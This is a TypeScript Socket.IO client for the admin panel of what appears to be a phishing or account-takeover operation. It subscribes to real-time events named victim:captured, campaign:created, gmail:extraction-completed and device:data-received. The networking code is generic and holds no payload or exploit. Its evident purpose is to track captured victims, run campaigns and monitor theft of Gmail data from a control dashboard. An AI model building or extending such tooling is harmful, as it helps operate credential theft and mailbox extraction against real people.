// Socket.IO client for real-time updates
import { io, Socket } from 'socket.io-client';

const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || window.location.origin;

interface ReconnectOptions {
  maxAttempts?: number;
  delay?: number;
  onReconnect?: () => void;
  onReconnectFailed?: () => void;
}

class WebSocketClient {
  private socket: Socket | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 10;
  private reconnectDelay = 1000;
  private reconnectOptions: ReconnectOptions = {};
  private subscriptions: Map<string, Set<(data: any) => void>> = new Map();
  private connectionListeners: Set<(connected: boolean) => void> = new Set();

  /**
   * Connect to Socket.IO server
   * @param {string} namespace - Socket.IO namespace (default: '/admin')
   * @param {ReconnectOptions} options - Reconnection options
   */
  connect(namespace = '/admin', options?: ReconnectOptions): Socket {
    if (this.socket?.connected) {
      return this.socket;
    }

    if (options) {
      this.reconnectOptions = options;
      this.maxReconnectAttempts = options.maxAttempts || this.maxReconnectAttempts;
      this.reconnectDelay = options.delay || this.reconnectDelay;
    }

    this.socket = io(`${SOCKET_URL}${namespace}`, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: this.maxReconnectAttempts,
      reconnectionDelay: this.reconnectDelay,
      reconnectionDelayMax: 5000,
      timeout: 20000,
      forceNew: false,
    });

    this.socket.on('connect', () => {
      console.log('Socket.IO connected to', namespace);
      this.reconnectAttempts = 0;
      this.notifyConnectionListeners(true);
      this.reconnectOptions.onReconnect?.();
      
      // Re-subscribe to all previous subscriptions
      this.subscriptions.forEach((callbacks, type) => {
        this.socket?.emit('subscribe:updates', { type });
      });
    });

    this.socket.on('disconnect', (reason) => {
      console.log('Socket.IO disconnected:', reason);
      this.notifyConnectionListeners(false);
      
      if (reason === 'io server disconnect') {
        // Server disconnected, reconnect manually
        this.socket?.connect();
      }
    });

    this.socket.on('connect_error', (error) => {
      console.error('Socket.IO connection error:', error);
      this.reconnectAttempts++;
      
      if (this.reconnectAttempts >= this.maxReconnectAttempts) {
        console.error('Max reconnection attempts reached');
        this.reconnectOptions.onReconnectFailed?.();
      }
    });

    this.socket.on('reconnect', (attemptNumber) => {
      console.log('Socket.IO reconnected after', attemptNumber, 'attempts');
      this.reconnectAttempts = 0;
      this.notifyConnectionListeners(true);
      this.reconnectOptions.onReconnect?.();
    });

    this.socket.on('reconnect_attempt', (attemptNumber) => {
      console.log('Socket.IO reconnection attempt', attemptNumber);
    });

    this.socket.on('reconnect_error', (error) => {
      console.error('Socket.IO reconnection error:', error);
    });

    this.socket.on('reconnect_failed', () => {
      console.error('Socket.IO reconnection failed');
      this.reconnectOptions.onReconnectFailed?.();
    });

    return this.socket;
  }

  /**
   * Disconnect from Socket.IO server
   */
  disconnect(): void {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
  }

  /**
   * Subscribe to real-time updates
   * @param {string} type - Update type (victims, campaigns, gmail, activity, devices)
   * @param {Function} callback - Callback function
   */
  subscribe(type: string, callback: (data: any) => void): void {
    if (!this.socket) {
      this.connect();
    }

    // Store callback for reconnection
    if (!this.subscriptions.has(type)) {
      this.subscriptions.set(type, new Set());
    }
    this.subscriptions.get(type)?.add(callback);

    // Join admin room
    this.socket?.emit('subscribe:updates', { type });
    
    // Listen to generic update event
    const updateHandler = (update: { type: string; data: any; timestamp?: string }) => {
      if (update.type === type || update.type === 'all' || type === 'all') {
        callback({ ...update, timestamp: update.timestamp || new Date().toISOString() });
      }
    };
    this.socket?.on('update', updateHandler);

    // Listen to specific events based on type
    if (type === 'victims' || type === 'all') {
      this.socket?.on('victim:captured', (data) => callback({ type: 'victim:captured', data, timestamp: new Date().toISOString() }));
      this.socket?.on('victim:registered', (data) => callback({ type: 'victim:registered', data, timestamp: new Date().toISOString() }));
      this.socket?.on('victim:validation-complete', (data) => callback({ type: 'victim:validation-complete', data, timestamp: new Date().toISOString() }));
    }
    
    if (type === 'campaigns' || type === 'all') {
      this.socket?.on('campaign:created', (data) => callback({ type: 'campaign:created', data, timestamp: new Date().toISOString() }));
      this.socket?.on('campaign:updated', (data) => callback({ type: 'campaign:updated', data, timestamp: new Date().toISOString() }));
      this.socket?.on('campaign:status-changed', (data) => callback({ type: 'campaign:status-changed', data, timestamp: new Date().toISOString() }));
    }
    
    if (type === 'gmail' || type === 'all') {
      this.socket?.on('gmail:access-initiated', (data) => callback({ type: 'gmail:access-initiated', data, timestamp: new Date().toISOString() }));
      this.socket?.on('gmail:extraction-completed', (data) => callback({ type: 'gmail:extraction-completed', data, timestamp: new Date().toISOString() }));
      this.socket?.on('gmail:extraction-progress', (data) => callback({ type: 'gmail:extraction-progress', data, timestamp: new Date().toISOString() }));
    }

    if (type === 'devices' || type === 'all') {
      this.socket?.on('device:connected', (data) => callback({ type: 'device:connected', data, timestamp: new Date().toISOString() }));
      this.socket?.on('device:disconnected', (data) => callback({ type: 'device:disconnected', data, timestamp: new Date().toISOString() }));
      this.socket?.on('device:status-changed', (data) => callback({ type: 'device:status-changed', data, timestamp: new Date().toISOString() }));
      this.socket?.on('device:data-received', (data) => callback({ type: 'device:data-received', data, timestamp: new Date().toISOString() }));
    }

    if (type === 'activity' || type === 'all') {
      this.socket?.on('activity:new', (data) => callback({ type: 'activity:new', data, timestamp: new Date().toISOString() }));
      this.socket?.on('activity:log-created', (data) => callback({ type: 'activity:log-created', data, timestamp: new Date().toISOString() }));
    }
  }

  /**
   * Unsubscribe from updates
   * @param {string} type - Update type to unsubscribe from (optional, removes all if not provided)
   * @param {Function} callback - Specific callback to remove (optional)
   */
  unsubscribe(type?: string, callback?: (data: any) => void): void {
    if (type) {
      if (callback) {
        this.subscriptions.get(type)?.delete(callback);
      } else {
        this.subscriptions.delete(type);
        this.socket?.off('update');
      }
    } else {
      this.subscriptions.clear();
      this.socket?.off('update');
      this.socket?.off('victim:captured');
      this.socket?.off('victim:registered');
      this.socket?.off('victim:validation-complete');
      this.socket?.off('campaign:created');
      this.socket?.off('campaign:updated');
      this.socket?.off('campaign:status-changed');
      this.socket?.off('gmail:access-initiated');
      this.socket?.off('gmail:extraction-completed');
      this.socket?.off('gmail:extraction-progress');
      this.socket?.off('device:connected');
      this.socket?.off('device:disconnected');
      this.socket?.off('device:status-changed');
      this.socket?.off('device:data-received');
      this.socket?.off('activity:new');
      this.socket?.off('activity:log-created');
    }
  }

  /**
   * Add connection state listener
   */
  onConnectionChange(callback: (connected: boolean) => void): () => void {
    this.connectionListeners.add(callback);
    return () => {
      this.connectionListeners.delete(callback);
    };
  }

  /**
   * Notify all connection listeners
   */
  private notifyConnectionListeners(connected: boolean): void {
    this.connectionListeners.forEach(callback => callback(connected));
  }

  /**
   * Get socket instance
   */
  getSocket(): Socket | null {
    return this.socket;
  }
}

// Export singleton instance
export const websocketClient = new WebSocketClient();
export default websocketClient;
